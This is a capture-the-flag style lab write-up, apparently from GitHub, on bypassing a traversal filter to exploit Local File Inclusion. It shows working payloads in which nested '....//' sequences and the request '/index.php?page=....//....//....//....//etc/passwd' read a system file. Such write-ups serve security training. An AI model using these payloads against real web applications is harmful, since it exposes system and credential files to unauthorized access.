# Local File Inclusion Filter Bypass

This is a lab for practicing **Local File Inclusion (LFI)** exploitation where the application applies a filter to directory traversal sequences.

Once we access the given URL, we are presented with a `404` page.

<img width="1092" height="385" alt="image" src="https://github.com/user-attachments/assets/8bb5192e-f7f8-48c0-936c-dfecb252f398" />

<img width="875" height="636" alt="image" src="https://github.com/user-attachments/assets/a4cf6e5a-6181-4598-8a3a-41eb2a45452c" />

Looking carefully at the URL, we can identify a parameter that may be worth testing.

<img width="530" height="39" alt="image" src="https://github.com/user-attachments/assets/732aaf87-f543-46c9-bdc7-557173eb11c7" />

The application uses the following parameter:

```text
/index.php?page=404.php
```

## Testing the Filter

Modify the `page` parameter to determine how the application handles directory traversal sequences.

```text
/index.php?page=404.php
→
/index.php?page=A../A
```

The response contains:

```text
AA
```

Since `A../A` becomes `AA`, we can infer that the application removes occurrences of:

```text
../
```

## Bypassing the Filter

If the filter only removes `../` once, we may be able to construct a nested sequence that becomes `../` after filtering.

For example:

```text
....//
```

After `../` is removed, the remaining characters can form:

```text
../
```

Using this technique, try:

```text
/index.php?page=....//....//....//etc/passwd
```

<img width="1366" height="143" alt="image" src="https://github.com/user-attachments/assets/b43ad805-f2be-4499-b7a1-ec957d1c9d26" />

The payload does not reach the target file. This indicates that another traversal sequence is required to move further up the directory structure.

Add one more `....//`:

```text
/index.php?page=....//....//....//....//etc/passwd
```

<img width="1209" height="180" alt="image" src="https://github.com/user-attachments/assets/3a9ef850-84d6-4bae-9371-b613981d3d13" />

The contents of `/etc/passwd` are successfully returned.

This confirms that the `page` parameter is vulnerable to **Local File Inclusion**, and the application's traversal filter can be bypassed using nested traversal sequences such as:

```text
....//
```
